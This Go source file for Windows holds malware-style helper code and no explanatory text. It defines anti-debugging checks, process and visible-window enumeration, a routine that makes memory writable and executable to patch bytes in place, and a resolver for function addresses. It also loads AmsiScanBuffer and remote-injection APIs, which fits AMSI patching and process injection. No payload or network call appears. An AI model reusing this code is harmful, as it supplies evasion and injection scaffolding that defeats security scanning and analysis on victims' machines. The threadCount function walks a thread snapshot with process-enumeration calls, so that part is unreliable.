//go:build windows

package main

import (
	"syscall"
	"unsafe"
)

var (
	k32   = syscall.NewLazyDLL("kernel32.dll")
	u32   = syscall.NewLazyDLL("user32.dll")
	adv   = syscall.NewLazyDLL("advapi32.dll")
	ntd   = syscall.NewLazyDLL("ntdll.dll")
	amsi  = syscall.NewLazyDLL("amsi.dll")
	psapi = syscall.NewLazyDLL("psapi.dll")

	pIsDebuggerPresent          = k32.NewProc("IsDebuggerPresent")
	pCheckRemoteDebuggerPresent = k32.NewProc("CheckRemoteDebuggerPresent")
	pGetCurrentProcess          = k32.NewProc("GetCurrentProcess")
	pQueryPerformanceCounter    = k32.NewProc("QueryPerformanceCounter")
	pVirtualProtect             = k32.NewProc("VirtualProtect")
	pGetModuleHandleA           = k32.NewProc("GetModuleHandleA")
	pGetProcAddress             = k32.NewProc("GetProcAddress")
	pOpenProcess                = k32.NewProc("OpenProcess")
	pCloseHandle                = k32.NewProc("CloseHandle")
	pCreateToolhelp32Snapshot   = k32.NewProc("CreateToolhelp32Snapshot")
	pProcess32FirstW            = k32.NewProc("Process32FirstW")
	pProcess32NextW             = k32.NewProc("Process32NextW")
	pGetModuleFileNameW         = k32.NewProc("GetModuleFileNameW")
	pVirtualAllocEx             = k32.NewProc("VirtualAllocEx")
	pWriteProcessMemory         = k32.NewProc("WriteProcessMemory")
	pCreateRemoteThread         = k32.NewProc("CreateRemoteThread")
	pIsWow64Process             = k32.NewProc("IsWow64Process")
	pNtQueryInformationProcess  = ntd.NewProc("NtQueryInformationProcess")

	pEnumWindows             = u32.NewProc("EnumWindows")
	pGetWindowTextW          = u32.NewProc("GetWindowTextW")
	pIsWindowVisible         = u32.NewProc("IsWindowVisible")

	pAmsiScanBuffer = amsi.NewProc("AmsiScanBuffer")
)

type processEntry32 struct {
	Size            uint32
	CntUsage        uint32
	ProcessID       uint32
	DefaultHeapID   uintptr
	ModuleID        uint32
	CntThreads      uint32
	ParentProcessID uint32
	PriClassBase    int32
	Flags           uint32
	ExeFile         [260]uint16
}

func currentProcess() uintptr {
	r, _, _ := pGetCurrentProcess.Call()
	return r
}

func isDebuggerPresent() bool {
	r, _, _ := pIsDebuggerPresent.Call()
	return r != 0
}

func remoteDebuggerPresent() bool {
	var b int32
	r, _, _ := pCheckRemoteDebuggerPresent.Call(currentProcess(), uintptr(unsafe.Pointer(&b)))
	return r != 0 && b != 0
}

func processDebugPort() bool {
	var port uintptr
	var ret uint32
	r, _, _ := pNtQueryInformationProcess.Call(currentProcess(), 7,
		uintptr(unsafe.Pointer(&port)), unsafe.Sizeof(port), uintptr(unsafe.Pointer(&ret)))
	return r == 0 && port != 0
}

func processDebugObjectHandle() bool {
	var h uintptr
	var ret uint32
	r, _, _ := pNtQueryInformationProcess.Call(currentProcess(), 30,
		uintptr(unsafe.Pointer(&h)), unsafe.Sizeof(h), uintptr(unsafe.Pointer(&ret)))
	return r == 0 && h != 0
}

func processDebugFlags() bool {
	var flags uint32
	var ret uint32
	r, _, _ := pNtQueryInformationProcess.Call(currentProcess(), 31,
		uintptr(unsafe.Pointer(&flags)), unsafe.Sizeof(flags), uintptr(unsafe.Pointer(&ret)))
	return r == 0 && flags == 0
}

func qpc() int64 {
	var v int64
	pQueryPerformanceCounter.Call(uintptr(unsafe.Pointer(&v)))
	return v
}

func threadCount() int {
	snap, _, _ := pCreateToolhelp32Snapshot.Call(0x00000004, 0)
	if snap == ^uintptr(0) {
		return 0
	}
	defer pCloseHandle.Call(snap)
	var pe processEntry32
	pe.Size = uint32(unsafe.Sizeof(pe))
	r, _, _ := pProcess32FirstW.Call(snap, uintptr(unsafe.Pointer(&pe)))
	if r == 0 {
		return 0
	}
	n := 0
	for {
		r, _, _ = pProcess32NextW.Call(snap, uintptr(unsafe.Pointer(&pe)))
		if r == 0 {
			break
		}
		n++
	}
	return n
}

func processList() []string {
	snap, _, _ := pCreateToolhelp32Snapshot.Call(0x00000002, 0)
	if snap == ^uintptr(0) {
		return nil
	}
	defer pCloseHandle.Call(snap)
	var pe processEntry32
	pe.Size = uint32(unsafe.Sizeof(pe))
	var out []string
	r, _, _ := pProcess32FirstW.Call(snap, uintptr(unsafe.Pointer(&pe)))
	if r == 0 {
		return nil
	}
	for {
		out = append(out, syscall.UTF16ToString(pe.ExeFile[:]))
		r, _, _ = pProcess32NextW.Call(snap, uintptr(unsafe.Pointer(&pe)))
		if r == 0 {
			break
		}
	}
	return out
}

func windowTitles() []string {
	var out []string
	cb := syscall.NewCallback(func(hwnd uintptr, lparam uintptr) uintptr {
		vis, _, _ := pIsWindowVisible.Call(hwnd)
		if vis == 0 {
			return 1
		}
		buf := make([]uint16, 512)
		n, _, _ := pGetWindowTextW.Call(hwnd, uintptr(unsafe.Pointer(&buf[0])), uintptr(len(buf)))
		if n > 0 {
			out = append(out, syscall.UTF16ToString(buf[:n]))
		}
		return 1
	})
	pEnumWindows.Call(cb, 0)
	return out
}

func patchMemory(addr uintptr, patch []byte) bool {
	if addr == 0 {
		return false
	}
	var old uint32
	ok, _, _ := pVirtualProtect.Call(addr, uintptr(len(patch)), 0x40, uintptr(unsafe.Pointer(&old)))
	if ok == 0 {
		return false
	}
	copy(unsafe.Slice((*byte)(unsafe.Pointer(addr)), len(patch)), patch)
	pVirtualProtect.Call(addr, uintptr(len(patch)), uintptr(old), uintptr(unsafe.Pointer(&old)))
	return true
}

func moduleProc(dll, name string) uintptr {
	h, _, _ := pGetModuleHandleA.Call(uintptr(unsafe.Pointer(strPtr(dll))))
	if h == 0 {
		return 0
	}
	p, _, _ := pGetProcAddress.Call(h, uintptr(unsafe.Pointer(strPtr(name))))
	return p
}

func strPtr(s string) *byte {
	b, err := syscall.BytePtrFromString(s)
	if err != nil {
		return nil
	}
	return b
}
